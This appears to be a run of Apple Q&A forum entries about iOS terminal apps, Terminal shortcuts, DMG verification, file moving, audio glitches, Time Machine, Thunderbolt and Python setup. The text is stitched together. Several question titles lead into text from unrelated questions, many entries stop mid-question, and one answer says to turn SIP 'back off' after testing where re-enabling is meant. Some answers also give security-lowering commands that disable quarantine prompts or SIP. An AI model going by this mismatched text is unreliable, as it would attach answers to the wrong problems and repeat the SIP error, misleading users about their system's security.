I would like an equivalent to Termux on iOS. It should in some way emulate a Linux command line with a full range of installable packages like apt and ideally even run Linux (as with Andronix), and be about as fast as the phone’s hardware normally allows.\nThere is iSH but for some reason I find it quite slow, I don’t know if it’s built in some fundamentally different way than Termux.\nIs there a good option for this (willing to jailbreak if necessary)?\n\nA: Yes, there are\n\n*\n\n*LibTerm available under MIT on GitHub\n\n*a-shell available under 3-Clause BSD on GitHub (These two doesn't differ from iSH much behind the scene, I guess but you can see some difference)\n\nIf you jailbreak there are lot other option like MTerminal, NewTerm etc.\nAnd lastly, projects are underway to port Linux on iPhone, see Project Sandcastle. PMOS (their wiki) and Ubuntu are known to boot on iPhone 7.\n\nA: To answer the question \"why\" (is there no equivalent to termux on iOS): iOS places more restrictions on binaries that can be executed or loaded. It's not enough to cross-compile, the binaries also need to be signed with the developer certificate and placed in a directory that can only be accessed when the app is written on the phone. So you just cannot add new executables to an existing app on a non-jailbroken iPhone.\niSH works around this limitation by loading x86 binaries, that are executed using their x86 emulator. The good part is that anything can be installed, the not-so-good part is that the emulator can be slow.\na-Shell (and before it OpenTerm, and also Libterm) work around this limitation by having all the commands written when the app is installed on the phone. So you have a lot of commands, and they're fast, but you cannot add more commands (full disclosure: I'm the author of a-Shell, and contributed a lot to OpenTerm).\n", "Q: Preview - add Signature by key command.

This makes contextual menu items difficult, but not impossible, to add commands to.\nA Signature in the menu, on the other hand, has no visible wording.

Don't want that ⌘N (Command-N) opens new tab instead new window. Only option-⌘N creates a new window.\nI want to get back to the traditional behavior. Most apps use ⌘N to create a new window, so I keep forgetting to add the option key just for the Terminal app.\n\n\nWhat's the easiest way to make ⌘N open up a new Window by default in Big Sur 11.6? Note: Terminal.app already has ⌘T to open a new tab so having two shortcuts to do that makes no sense.\n\n\n\n\nA: I expect your problem might be resolved if you go to System Preferences -> General and change the “Prefer Tabs” menu option to “in full screen” or “never”, whichever you might prefer, from “always”.\n\nUpdate\nFor those interested, this setting was under System Preferences -> Dock for Catalina (10.15), Mojave (10.14), High Sierra (10.13), and Sierra (10.12).\n\nA: The answer I accepted by @Alper,is the best workaround so far. I call it a workaround, because there is buggy behavior bug as of Big Sur 11.6. By changing prefer tabs to never, it breaks the configuration I liked for Safari where I do prefer new tabs.\nThese are the problem areas:\n\n\n*\n\n*General System Preferences → Prefer Tabs, \"always\"\n\n*Keyboard System Preferences → Shortcuts\n\n*Terminal.app menus\n\"Prefer Tabs always\" has the following associated misbehaviors, and I've filed feedback with Apple about it:\n\n*\n\n*Terminal.app : Shell → New Window → New Window with Profile no longer works. It opens a new tab instead of window, even if that menu item is explicitly selected with mouse or trackpad. Assigning a shortcut to it doesn't fix that (i.e. Keyboard System Preferences → Shortcuts). That's a bug.\n\n\n*By accident I discovered Option-⌘N in Terminal.app does open a new window. However, defying precedent, there is no corresponding menu item with Option-⌘N assigned to it, whereas hotkeys generally correspond to menu items. The only menu option that says it can create a new window (per issue 1 above), does the wrong thing, and isn't even associated with Option-⌘N, which creates a new window.\n\n\n*When ⌘N creates new tabs (in aforementioned scenario), the new tab created shrinks all the existing tabbed panes down to the default size of the new window! That really disrupts the workflow, since I don't want to resize the other tab, which may have corresponded to big windows. That weird tab-resizing behavior doesn't seem to occur with ⌘T which is the standard menu item to create a new tab.\n", "Q: Which disk did I boot from?

If I put a .dmg file on it (anywhere) and try to mount it, MacOs will ALWAYS verify it first, which means reading through the whole thing, which takes almost 30 minutes for a 200GB file over GBit Ethernet.\nSo again, the scenario is: An SMB server exports a share, I mount that normally on the Mac (which works fine), the share contains a .dmg file, I try to mount that, the .dmg file gets verified. Every time. After that, the mount succeeds and I can use the dmg's filesystem without issue, but the 30 minute verification is a total show stopper.\nI tried the following things, none of which help (all from How do I skip verification of a .dmg file?):\n# Disable the \"Are you sure you want to open this application?\" dialog\ndefaults write com.apple.LaunchServices LSQuarantine -bool false\n\n# Disable Disk Image Verification: Verifying ...\ndefaults write com.apple.frameworks.diskimages skip-verify -bool true\ndefaults write com.apple.frameworks.diskimages skip-verify-locked -bool true\ndefaults write com.apple.frameworks.diskimages skip-verify-remote -bool true\n\nMounting the thing with hdiutil attach -noverify mounts the filesystem read-only -- useless.\nThis is an M1 Mac running Big Sur.

Based on some metadata that I have from another source, I want to move about a thousand of those images to a new folder (it's just too many to move by hand). I have a csv file that includes the names of the files to move, but I can't figure out how to get Automator to let me set the list as a criteria. The filenames are all randomly assigned strings of 32 numbers and letters, so I don't think this is a matter of filtering.\nHow would I go about moving ~1000 files from one folder to another using a csv/list? Maybe it's possible that Applescript is a good option, but I can't say I've ever looked there at all, so I'd be starting from scratch.\n\nA: To move files to another folder would not require the use of the Automator or Apple Script. You could accomplish this by entering commands in a Terminal application window.\nExample 1\nBelow is the contents of a file nameed list.csv. This file just contains the names of files to be moved to another folder.\nfile001,file002,file003\nfile004,file005\nfile006\n\nFrom bash, the command below would move the files to a folder named MyTarget.\n(IFS=,; while read -u 5 -a w; do for j in ${w[@]}; do mv -i \"$j\" MyTarget; done; done)5<list.csv\n\nFrom zsh, the command would change to the following.\n(IFS=,; while read -u 5 -A w; do for j in ${w[@]}; do mv -i \"$j\" MyTarget; done; done)5<list.csv\n\nNote: You can do a dry-run by preceding the mv with echo. For zsh, the command would appear as shown below.\n(IFS=,; while read -u 5 -A w; do for j in ${w[@]}; do echo mv -i \"$j\" MyTarget; done; done)5<list.csv\n\nThis command would produce the following output.\nmv -i file001 MyTarget\nmv -i file002 MyTarget\nmv -i file003 MyTarget\nmv -i file004 MyTarget\nmv -i file005 MyTarget\nmv -i file006 MyTarget\n\nExample 2\nBelow is the contents of a file nameed list.csv. Here, the name of a file to move is the second item on each line.\nblack,file001,yes,5\nbrown,file002,no,6\nred,file003,no,7\norange,file004,yes,30\nyellow,file005,no,3\ngreen,file006,no,99\n\nFrom bash, the command below would move the files to a folder named MyTarget.\n(IFS=,; while read -u 5 -a w; do mv -i \"${w[1]}\" MyTarget; done)5<list.csv\n\nFrom zsh, the command would change to the following.\n(IFS=,; while read -u 5 -A w; do mv -i \"${w[2]}\" MyTarget; done)5<list.csv\n\n", "Q: How to run VSCode Integrated Terminal in x86_64 on Apple M1 (arm64)? VSCode now has an arm64 version, problem is there are still a lot of command-line developer tools that are using x86_64 architecture.\nAt the moment there doesn't appear to be a plugin or preferences to load the Integrated VSCode Terminal in a specific arch.\n# load up the Integrated Terminal in VSCode\necho $TERM_PROGRAM # will say vscode\n\n# check arch\narch # will say arm64 if you have Apple M1\n\n\nA: I fiddled with trying to add another shell, etc, but found the easiest thing was to update your shell config to look for vscode.

Since yesterday, on my iMac (A1419 EMC 2806) the fan is maxing out from power up, regardless of safe mode, recovery mode, or booting into Windows (via Boot Camp), diagnostics return PFM006 (SMC error) Assuming a thermal sensor defect, I installed iStats to check the thermal sensors. Readout below in the screenshot - all temperatures are within normal ranges, the fan is at maximum and also won't slow down if I try to do that manually, and the only temperature that's missing is the one from the power supply unit (AC/DC T2 secondary heat sink). So my question is: Is there even such a sensor in that model, do I expect a readout here? Have I thus found the probable cause and should be looking into the connection or the sensor itself?\n(No other hardware or software changes made recently)\n\n\nA: I exchanged the power supply unit as a whole, assuming that the thermal sensor is integrated as I had read elsewhere.

It doesn’t get synced to iCloud normally (so no cloud saves across devices). Does iCloud device backup back up the app data of such apps? If I erase the iPad, send it in for repair, and then restore from iCloud, will I get this save data back?\n\nA: Yes, iCloud Backup does backup the data of apps that do not otherwise sync with iCloud.\nIf you erase the iPad, send it in for repair, and then restore from iCloud Backup, you will get the data for such app's back. Note that there are some exceptions, where the app developer has specifically requested that their data may not be backed up in iCloud. Usually this is authentication tokens, which means that you will have to login to the app once again after restoring from backup.\n", "Q: How to switch to second window of a running app with applescript?

(unless there is an if condition i can use to only trigger it if that window is not already active).\nI also found a better solution via app main menu see below.\nHowever I'd still like to know if there is another/better way to specifically target a window i.e. second window of an app without using any menus.\n\nA: ALTERNATIVE SOLUTION via app menu\nSince MS Teams lists the windows in the \"Window\" menu and it's always the last one in the list as far I know i managed to use the below which is much quicker and doesn't show any menu popups, sweet.\nAdding the solution here as initially I didn't ask for a solution specific to the dock menu but rather how to trigger the second window of a running app and this solution is better.\nEDIT:\nTurns out I also need set frontmost to true since the second window was successfully moved forward but the last active app staid still in front and prevented hotkeys to trigger in the second window.\n\ntell application \"System Events\" to tell application process \"Microsoft Teams\"\n    click (last menu item of menu 1 of menu bar item \"Window\" of menu bar 1)\n    set frontmost to true\nend tell\n\n\nA: I do not have Microsoft Teams, so I cannot test the example AppleScript code show below, however it works on the other applications I tested it on.\nBased on the screenshot in the OP, assuming you want to actuate the menu of a Dock Tile and click a menu item, then here is a way to do it.\nExample AppleScript code:\ntell application \"System Events\"\n    tell UI element \"Microsoft Teams\" of list 1 of application process \"Dock\"\n        perform action \"AXShowMenu\"\n        delay 0.1\n        click menu item 2 of menu 1\n    end tell\nend tell\n\n\nNotes:\nThe example AppleScript code uses UI Scripting and can be kludgy and is dependent on allowing the script to complete before performing any other actions manually.\n\nNote: The example AppleScript code is just that and sans any included error handling does not contain any additional error handling as may be appropriate. The onus is upon the user to add any error handling as may be appropriate, needed or wanted. Have a look at the try statement and error statement in the AppleScript Language Guide. See also, Working with Errors. Additionally, the use of the delay command may be necessary between events where appropriate, e.g. delay 0.5, with the value of the delay set appropriately.\n", "Q: How to fix/restore a deleted MacOS partition?

I don't understand exactly what the avconvert —multiPass and —disableFastStart parameters do.\nReading the manpage didn't get me any further.\nThank you for an answer\n\nA: Setting the -multiPass option means that the program tries to achieve a higher quality encoding by going through the whole movie more than once. Essentially you're making the trade off that you're getting a slightly higher quality output at the expense of taking considerably longer to encode.\nSetting the -disableFastStart option means that the converted movie won't feature Fast Start. Fast Start means that you can place the movie on a web server and a user can start viewing the movie while downloading. If you disable Fast Start, the user will have to fully download the movie before it can be viewed. The upside is that fewer disk accesses (i.e. less \"strain\" on the system) is required when Fast Start is disabled.\n", "Q: How to find .mp4 files in a specific directory and create txt file with additional text wrapped around the filenames I'm new to the Mac Terminal.

But, like all Un*x systems, they do or can support \"XWindows/Xorg\" which is also what's used by Linux.\n\"XWindows/Xorg\" is actually a quite-interesting client/server windowing strategy which your Linux box actually uses all the time even though you don't see it.  (Macs usually use other strategies but still support it to allow some applications to run.)  Client and server are exchanging drawing commands, which allow the client to create the imagery that the server instructs it to produce.

The fan issue happens pretty much at all times and all work loads.\nIve run the following terminal command sudo powermetrics and got the following result :\nAny ideas ?\n\n\nA: Think ive found the issue.\nI took the back off the Laptop and the fans were full of dust.\nIm not quite sure how they got so dusty, but cleaned them out using a can of air and the laptop fans are running much less now.\n", "Q: The list of audio input/output devices is empty after waking MacBook Pro M1 from sleep I'm on a M1 MacBook Pro. For a couple of weeks now, every time I wake the Mac up from sleep, the list of audio devices is empty and shows \"No output/input devices found,\" like so:\n\nI can still hear the audio coming from the MacBook speakers, however, and the item \"MacBook Pro Speakers\" still shows up on the Sound section of the menu bar.\nWhen I add a new sound device, for example when I plug headphones in, they show up the devices list. But if I quit and reopen System Preferences, the list shows up empty again.\nThe main issue is that because the device list is empty, Zoom and other web meeting platforms do not recognize the output/input devices, requiring me to restart my computer before every meeting. This is what Zoom shows in their settings. Strangely, I can record just fine with Voice Memos even when the list is empty.\nDoes anyone know how I can troubleshoot this? I haven't installed any kernel extensions or things that could play with that, so I'm at a bit of a loss.\nUpdate: I updated to Monterey 12.0.1 and the problem persists.\n\nA: There must have been a conflict in the audio plugins. The M1 Macs get unstable over time if you install apps that have audio recording feature, since the permissions have changed. For me, I've installed Zoom, Teams, Krisp, Utterly, BoomAudio. Here's the solution I used:\n\n*\n\n*Go to /Library/Audio/Plug-Ins/HAL/ folder. This folder contains the systemwide audio extensions that were installed by third-party apps.\n\n\n*Delete folders from the apps you're not using. These files are just plug-ins, not core files so it won't affect your Mac performance.\n\n\n*Restart the machine. You will be expected to reinstall some of the apps you've deleted the plugins from.\nMy advice is to not install too many apps with audio recording features. The M1 is still in its infancy and developers are still adapting to the architecture.\n\nA: Open Terminal and run sudo killall coreaudiod. In my case, it works like a charm.\n", "Q: Can you add arrow keys to an iOS 15 keyboard?

Then they stopped working.\nAfter I got a new laptop with Catalina, I would regularly get an error message saying that the backup needed to be deleted and was starting over. Sort of defeats the purpose of a backup when it gets regularly deleted. Then my wife started getting the same error on her computer... and then it got even worse on mine, where it just wouldn't back up at all.\nSince my wife is also getting problems on her computer, it doesn't seem like the issue is with my setup. I started looking for alternative backup solutions. I tried Carbon Copy Cloner and Super Duper, and they both took an interminably long time... and then failed anyway.\nI would imagine that a big part of the problem, if not the whole problem, is just that Apple isn't supporting Time Capsule anymore. But it is supporting Time Machine, I think. So it looks like what I need is a good third-party wireless router that will support Time Machine. But before I blow hundreds of dollars, I wanted to check in with people who know what they're doing. If I buy a good third-party Time Capsule equivalent, will that allow me to go back to the old way of using Time Machine? And are there particular things that I should look for in the hardware to make that happen?\n\nA: Time Capsules are still fully supported up to the lastest macOS (currently Big Sur).\nTime Machine is the software part of it all. Time Machine will perform recursive backups to\n\n*\n\n*an external drive (USB, Thunderbolt, FireWire, ...)\n\n*a Time Capsules internal drive\n\n*an external drive connected to an AirPort/Time Capsule via USB\n\n*any Time Machine compatible network device (most reputable NAS brands and some routers)\n\nTo start troubleshooting your issue I would recommend you reset your TimeCapsule, format the HDD and reconfigure (deactivate, reactivate) TimeMachine on all Macs.\nYou could further try to see if the issue occurs when an external drive is connected to your TimeCapsule (this would rule out the TimeCapsules internal HDD as a source of error).\n", "Q: Macbook Air Can Not Start After Trying to Remove Ubuntu I was trying to remove Ubuntu (dual boot) from my 2017 Macbook Air.

Regardless of any bad user actions or badly designed hardware or software, the OS must always be resilient and fail gracefully. A shutdown or reboot here means that you have found, at minimum, a bug in macOS (or, probably more likely, bridgeOS), and possibly also a bug in the ThinkPad.\nApple has a longstanding history of latent bugs being exposed by faulty peripherals and you are stumbling into yet-another of these. At the end of the day, because you are not an Apple engineer with access to their source code and debugging tools, you will never find and fix the root cause yourself. So the one thing to always do in these situations is to report the bug to Apple (links one and two). Please do this first so that they are able to collect failed-state data from you.\nThen, until this bug is fixed and an update issued, your next step is to find a workaround. A few things come to mind:\n\n*\n\n*Obviously, you can try to avoid using the ThinkPad, but this doesn't really count as a workaround.\n\n*Update to the latest macOS, which you have already done.\n\n*Can you try attaching to the USB-C ports on the other side of the MBP? There is an actual hardware difference in the signal path between the left and right sides which occasionally makes a difference for these kinds of bugs.\n\n*Can you try attaching through another device (like a USB hub) rather than directly into your MBP?\n\n*If this is the result of a software race condition, we can fiddle with a few big hammers. One is to temporarily disable CPU C-states. Note that this will dramatically increase power consumption so you should reenable them after testing. The procedure is to add the cstates=0 argument to your boot-args. (If you're not familiar: First disable SIP, reboot back into normal macOS, and run sudo nvram boot-args=\"cstates=0\", making sure that you're using straight quotes by copy-pasting rather than entering smart/curly quotes. Reboot and now you're running with C-states disabled. See if this problem goes away or not. If so, it's valuable info to pass on to Apple. To undo, run sudo nvram -d boot-args and reboot; you can turn SIP back off at that point.)\n\n*Similar to the above but having a more dramatic effect on performance: You can temporarily run in a single-threaded CPU mode. Same procedure as #5 except instead of cstates=0 you would put cpus=1. You will really feel the effects of this as everything will be slower. But it's a good test to try.\n\n", "Q: When viewing man pages in Terminal, how to get correct man page order priority? `man` shows the correct manpage but Terminal shows an older one I love using the Terminal's man page viewer.  You can right click on anything and open its corresponding man page. Or just run open x-man-page://1/<man page>\nHowever, I'm having trouble getting Terminal to prioritize the right man page over a pre-installed one.  Specifically it's the man page for the newer version of rsync installed by homebrew.  Running man rsync in a shell shows the correct rsync manpage, from /usr/local/share/man/man1/rsync.1, but using Terminal's manpage viewer shows the man page for the old version of rsync from /usr/share/man/man1/rsync.1.gz.\nA very temporary solution is to run Terminal like this:\n$ MANPATH=/usr/local/share/man /System/Applications/Utilities/Terminal.app/Contents/MacOS/Terminal\n\nThat starts Terminal with MANPATH set and it then looks in the right spot to find the new rsync man page. But setting MANPATH overrides all the other smart ways of finding man paths.\nNote that the issue only shows up when there's multiple man pages for the same command.  Somehow man rsync knows to prioritize the man page installed by Homebrew in /usr/local/share/man but Terminal prioritizes /usr/share/man/\nI tried editing /private/etc/man.conf and to /usr/local/share/man first, but it had no effect.  Even commenting out all the /usr/share/man references had no effect.\nAny ideas how to get Terminal's x-man-page:// to prioritize the right man page like just running man does? Cheers!\n\nA: I was wondering this too. I couldn't find a direct solution that was better than your workaround of setting MANPATH before launching Terminal.app.\nAn alternative workaround is to use man, as that's giving you the correct page, and the open command to view the man pages in TextEdit instead of Terminal's view. This can be wrapped in a function (and set in ~/.bashrc) for easy access, e.g.:\nmano() { MANWIDTH=100 MANPAGER='col -bx' man \"$@\" | open -f; }\n\n# use with e.g.\nmano rsync\n\nDepending on your default settings in TextEdit, this can give a nice view, with the good search function etc. You can also open the man page in a browser by adding -a <application\\ name> after the open command. E.g. for Google Chrome:\nmano() { MANWIDTH=100 MANPAGER='col -bx' man \"$@\" | open -f -a Google\\ Chrome; }\n\ntip source: scripting osx\n", "Q: How to make Finder not limit my file selection at all I want to select an application installed from Homebrew for dealing with files of a certain type.

Now I can navigate to the directory with the applications under /opt but when I come to the list of binaries there they are \"grayed out\" so I can't select them. I selected Enable: All Applications but it doesn't make a difference.\nHow can I make Finder just do the right thing? Also, sometimes I'd want to use a command line app. In other OSes sometimes you can associate the filetype with something like:\nTerminal -c foobar %s\n\nWhere \"Terminal\" is any given console and %s is the file to open.\nThe file I want to associate with the filetype is a symlink if that matters.\nWhat is the way to do this on Mac?\n\nEdit: is there a shell script or set of steps for creating an ersatz .app directory, enough to make Finder see it?\n\nA: You cannot assign an executable directly to handle opening files in Finder. It does not matter where it's installed. This is because the system expects applications to present as .app bundles.\nTo run an executable with a file, you should run it from the command line. There are ways to run it from the right-click menu using Automator or Shortcuts.\nIn Automator, create a Quick Action. Configure it to receive \"files or folders\". Add a \"Run Shell Script\" that passes input as arguments (or stdin if you are familiar and prefer that). You can use $@ for all the files or $1-$n for specific files.\ndosomething $1\n\nIn Shortcuts, check \"Use as Quick Action\" in the sidebar and configure it to receive files. Use the same contents of a Run Shell Script action as in the Automator example.\nEither of these will show up in the Services menu, which is visible at the bottom of the right click menu in finder.\n", "Q: How to make Apple Watch Stop SMS/Message Notifications from Unknown Senders?

Ideally I don't want to turn off notifications from messages in general, as getting important sms on the Watch is one of the most important features for me.\n\nA: As another person receiving spam from the Flubot scams, I tried looking into this. There are no easy switches unfortunately, but there are many messy workarounds:\nhttps://discussions.apple.com/thread/250140044\nThere are other tips that don't work here, such as the option to Filter Unknown Senders, which seems to only work for iMessage, which Flubot doesn't use most of the time. The Silence Unknown Callers option does not work for this case, since Flubot is primarily a text-based scam, not calls.\nAnd also blocking individual numbers, but that doesn't work here either, since Flubot sends from hundreds (thousands?) of different numbers.\nThere's essentially no real solution for now. You may have also come across this:\nhttps://bgr.com/tech/ios-15-features-sms-spam-filter-brazil-only/\nbut that is only available on Brazil.\n\nA: One work-around is as follows:\n\n*\n\n*Disable SMS notifications on the watch\n\n*Disable SMS notifications on the phone from unknonw senders: settings - notifications messages - customize notifications - unknown senders to off\n\n*Tell the really important people (e.g., partner, kids, etc.) who need to reliably contact you using real-time message notifications on the watch to use a different messaging program (e.g., Facebook Messenger, WhatsApp, etc.)\n\nThe result is that you never get spam message notifications on your watch.

On most Linux distributions, you have the ability to press Ctrl+Alt+F1 to open TTY1.\nDoes macOS have this ability? Is there a way to enable it?\nIf macOS freezes, it could be quite handy to be able to switch over to a TTY to enable one to execute a command or two to fix things.\nIf it matters, I am using a MacBook Air M1.\nThere is an answer on stackoverflow suggesting that you can use Fn+Ctrl+Alt+F1, but that doesn't seem to work for me. It is also from 2009, so it could very well be out-of-date information.\n\nOnly one TTY (TTY1) is available in OSX.\nTo enable tty use fn+ctrl+alt+F1.\n\n\nA: macOS boots into the graphical environment directly, there is no underlaying TTY from which the GUI is started (unlike Linux which boots into text mode from where you start X11 or whatever graphical environment you use).\nYou can enable ssh logins and then try to log in via ssh if the GUI freezes. This obviously requires access to a second device though.\n\nA: nohillside is correct that no equivalent to \"Ctrl+Alt+Fn\" exists on the Mac.  The GUI implementation is not the same, although MacOS does have the ability to run XWindows/XOrg based applications through the use of an appropriate built-in tool.\n", "Q: How can I push 4K @ 60Hz from 2016 MacBook Pro?

However, Windows is able to support it fine.\n\nWhen I attempt to run this from macOS, I only see 30Hz, 25Hz, and 24Hz options. I have attempted to Option + click on Scaled resolutions and showed all resolutions, but they all still just support at most 30Hz. I also installed SwitchResX, but from quickly looking around at the options there, there was no 60Hz 4K option - there was a 1440p @ 60Hz option that showed up, although it was not HiDPI. I have also tried resetting NVRAM, with no changes.\n\nThis seems like it is definitely a software issue given that it is fully functional on Windows, but I am lost on how to bypass macOS thinking it can't drive the display at 60Hz.\n\nA: I just bought the same monitor (Dell S2721QS 4K) and had exactly the same issue connecting to my 2017 MacBookPro (four Thunderbolt ports). I was using the HDMI 2.0 cable that came with the monitor and the official Apple HDMI to USB-C adapter.\nTo fix the issue: I ordered a DisplayPort to USB-C cable (https://www.amazon.fr/gp/product/B07S7NTNHC/ref=ppx_od_dt_b_asin_title_s00?ie=UTF8&psc=1) for ~€11 and it arrived today and I've now got a lovely range of 60 Hz resolutions to run the external monitor at!\n\n\n", "Q: How can I ensure photo folders are synced to iPhone in correct time order? I'm syncing some local folders so they appear as albums \"From my Mac\" in my iPhone Photos app. It works, but the ordering is wrong.\nThe files in the local folders are actually symlinks into nested folders on a backup drive (actually a Photos.app library) so the paths are mapped like this example:\n~/Pictures/example/A75BB473-E7A7-4B52-A184-6BB6D60AFA41.jpeg\n->\n/Volumes/drive/example.photoslibrary/originals/A/A75BB473-E7A7-4B52-A184-6BB6D60AFA41.jpeg\n\nNote that I am syncing folders not albums, and this is for good reason. Syncing albums is broken for photo libraries on network drives.\nThe photos import no problem, but the order is weird. I can't align it with any ordering I can replicate in the finder. They are roughly time ordered based on the EXIF \"Date Time Original\" tag, but not quite.\nOn the iPhone clicking a photo shows the correct date from the EXIF data, but this is seemingly not being used for ordering. Neither is the file name.\nThe created, modified and access timestamps on the original photos are all the same, so this doesn't seem the principle ordering value either.\nHow does the iPhone sync process determine the order these appear in the album? What can I do to ensure correct time ordering?\n\nA: Photos for iOS will sort your photos in order on EXIF date in the main Library tab.\nIf you are creating albums in the syncing process and they are not in order, open the album and click the three dots in the upper right hand corner. From this menu, choose \"Sort\" and select the sorting criteria you prefer.\n", "Q: Macbook Notes app can't access data I was using the notes app just fine when I closed and reopened it to a pop-up message saying that it couldn't access my data.

I've noticed this problem since then, but the hard disk literally doesn't get detected on any other computer. I've tried it on multiple Windows computers and laptops and it just doesn't pop up.\nThe drive is connected, the light is on but its not detected. Its only become a problem now that I need to store things from other computers and not just my primary laptop. I attempted a partition but that took hours and didn't move forward at all, I tried first aid but that keeps failing due to an unmounting error. Please tell me someone has answers.\n\nA: It's probably just that Windows doesn't have a driver for that file-system format.\nAlso, please note that Time Machine doesn't present a backups.backupdb file on certain drives such as SSD's which use the APFS format.  Instead, the backup occupies its own \"volume.\"  But a \"volume\" is a logical subdivision of the available disk space, not a physical one.  If you want to put other files on your backup drive, you do so by creating a new \"volume.\"  You do not set a size for that volume – disk-space is simply allocated as needed for both the Time Machine volume and any other ones.

Strangely, the \"Voice Memos\" application on the Mac does not seem to have the ability to copy memos off the device, as the \"Photos\" application fortunately still does.\n\nA: Not sure if this is the best alternative but you can use AirDrop to transfer voice memos.\nFirst make sure Wifi and Bluetooth are turned on both on your iPhone and Mac. Then make sure AirDrop discovery is set to everyone or at least contacts only.\nNow open the Voice Memos app on your iPhone and tap on a voice memo. Then tap on the three dots to appear and then on Share. Then select AirDrop from the choices to appear and then choose the option with your Mac’s name. The voice memo should then appear in your Downloads folder.\nSee the AirDrop option in this article for more details.\n", "Q: Why did my iphone ask for my macbook air password? I just did a security update on my iPhone SE (2020) (IOS v15.0.2).  Afterwards, I clicked on Settings -> Apple ID, iCloud because it said that I needed to complete something with my Apple ID to sign in.  I signed in using my Apple ID password (which is fine) but then it prompted me to enter my Macbook Air's password (which I did, maybe I shouldn't have).\nI may have missed a step here.  Unfortunately I can't reproduce exactly the sequence of events.\nOn my Macbook Air, according to System Preferences -> Apple ID -> iCloud I am only saving my Contacts, Calendars and Find My Mac to iCloud.  Note that I do NOT save my Keychain to the cloud.\nWhy did Apple want my Macbook Air password?  It was my impression that it is locally used and that it (nor its hash) is stored in the cloud.  Clearly Apple has a hash of it stored somewhere.\n\nA: To allow recovery of end-to-end encrypted content (Keychain, Health data, HomeKit, etc.) your device passwords are used.\nWhen your phone prompted for your MacBook Air password, it needed that password to gain trusted access to those items in iCloud. This is normal and you were correct to enter the password (to the same extent you would have been correct to enter your iCloud password in the same context).\nThe alternative is reduced account security or the inability to recover those items if you forget your main Apple ID password.\nJust because you have Keychain off does not mean that your devices to not get access to this trusted data store. They are still authorized, they simply will not when those checkboxes are disabled. The alternative would have been resetting those parts of the iCloud data store (in most cases they would be automatically refilled from on-device data).\n", "Q: Small magic keyboard only sends Fn keys, not media keys I have a 2020 MBP running Catalina.

I assumed that the documents were being uploaded to iCloud drive, but I'm not able to find them.\nCould someone please help me figure out why cloud storage is being used while the documents are missing?\n\nA: Your PDFs and books stored in the Books app are taking up your 2GB of storage. You can disable these documents uploading to iCloud in Settings > Books. Disable the switch labeled \"iCloud Drive.\"\nWhen you download a document in Safari, it goes to the location specified in Safari settings. You can open Settings > Safari > Downloads and see what it says. On my phone, it says \"On My iPhone / Downloads.\" To view these documents, open \"Files\" and click Browse tab to navigate to the location mentioned above.

I have a question about Thunderbolt.\nthe snapshot introduces Thunderbolt 3.\n\nyou see there are two parts:\n\n*\n\n*socket\n\n\n\n\n*plug\n\n\nI want to know the Thunderbolt refers to the socket or the plug?\nor both?\n\nA: Actually it's neither.\nThe plug is a USB-C connector.\nThe socket is a USB-C socket.\nThunderbolt 3 is the specification that details the pin-layout, signals, cable requirements, power and protocols that, amongst other things, makes it possible for those connectors, plugs and cables in the picture to enable the functionality mentioned.\nYou can read a more in-depth description in this technology brief:\nhttps://thunderbolttechnology.net/sites/default/files/HBD16235_Thunderbolt_TB_r05.pdf\nThe brief is a bit more technical than just the illustration, but still at a level that can be understood without being a computer engineer.\n\nA: Thunderbolt is the protocol, and the physical connectors it uses are USB-C and mini-DP.  For those that remember the old Ethernet plugs this is kind of like the old use of BNC vs. RJ connectors.  They were both Ethernet but in different physical form, which had different specifications on cord length and data bandwidth, but so long as one had the right kind of cables, hubs, and adapters everything could talk to each other without any major issue.\nWhere this analogy breaks down is that USB-C has more power and alternate modes.  USB-C and mini-DP would both often offer a DisplayPort alternate mode, but this is \"often\" which means not always.  A DisplayPort cable can be used for both USB-C and mini-DP if that is a supported mode to get video.  USB-C allows sufficient power to pass to power the display from the host, or the host from the display, but mini-DP does not.  USB-C also allows for USB data to pass between host and display along with DP and TB data.  With mini-DP this USB communication is possible with additional hardware in both the host and display, with the USB data being encoded within the TB data stream.\nThunderbolt, or TB, is a protocol that is built in a way to share the data and power path with other compatible protocols built for the same port.  On USB-C TB can share the cable with DP and USB.  In theory other protocols are possible, like MHL, but I have not seen that put to use.  TB on mini-DP allows sharing the cable with DP and protocols that fit within TB.  There's some power on the mini-DP cable but it is quite low, and this power only flows from the host to the adapters.\nThunderbolt comes in different versions, much like USB, which each version adding bandwidth and other features.  The big one is speed.  TB1 is 10 Gbps, TB2 is 20 Gbps, TB3 is 40 Gbps, and TB4 is also 40 Gbps but adds some security features, makes some features mandatory that were optional with TB3, and supports USB4 packets alongside DP and TB packets.\nBecause TB is different than the other protocols used on mini-DP and USB-C ports the cables required to use TB can be different.  TB data needs a cable certified for TB, though sometimes a well made USB-C or mini-DP cable will work as normal or with reduced speed.  The host and device will negotiate the speed the cable will allow, and this speed should be visible with the right kind of diagnostic tools for those curious.\nThat may be more than what was asked for but I'm trying to be complete and concise.  If you want to see TB performance from your TB ports then use TB certified cables and devices.  If backward compatibility is desired then use DP cables and devices, USB cables and devices, or whatever the case may be.  Mixing up the cables may or may not work.  Feel free to experiment if you like on mixing up cables since it will not hurt anything, but just be aware that using USB cables on TB may work but at lower bandwidth.\nOh, and the different cables should be identifiable by use of icons on the cable ends.  TB uses a thunderbolt symbol and may have a number indicating the version it supports.  USB will have a trident and often a number to show the Gbps it supports, those being 5, 10, 20, or 40.  DP cables will have a stylized DP to indicate support.\nThere is still more to be said but that's plenty, I believe, for now.\n", "Q: Auto start apps not starting on scheduled boot I'm not really sure if I'm missing something here, but isn't the idea behind the auto boot and auto shutdown that the mac is ready to work with in the morning when starting to work?\nFor me that's not quite working.\nMy Mac starts every morning at 9, I'm in the office at 10 and the Mac is ready to enter my password.\nBut as soon as I do that, all the auto start apps start opening.

I'm seeing a fair amount of conflicting information on Reddit and Stack Overflow on this topic. I'm a long-time Linux user, just bought my first macOS computer.\nFor python development, I'm seeing that python is already installed on my Mac. I'm also seeing some posts that say I shouldn't use the pre-installed version and should download the installer from python.org. I'm also seeing some posts saying that I shouldn't use the installer, but instead should use Homebrew to install python2 and python3.\nIs there an authoritative source, or somewhere that explains the pros and cons of the different methods? I use pip extensively, is there a method that will cause the least amount of issues with that?\nIf I were to install python2 and python3 via either of the above two methods, would they replace the system versions of python? If they don't replace the system python, are the brew/installer versions automatically sourced first in my PATH?\nSorry, I know this is a flood of questions, I'm just trying to understand how the OS works regarding installers/brew.\n\nA: There isn't going to be an \"authoritative\" source.\nThe reason people tell you not to use the system python is that it is python 2.7, which is no longer supported by python.org.\nThere is no problem with having multiple versions of python installed, you should install what you want to use.  Unless you do something deliberate, you cannot overwrite the system python, nor should you, parts of the OS still use it.\nApple distributes python 3.7 and python 3.8 as 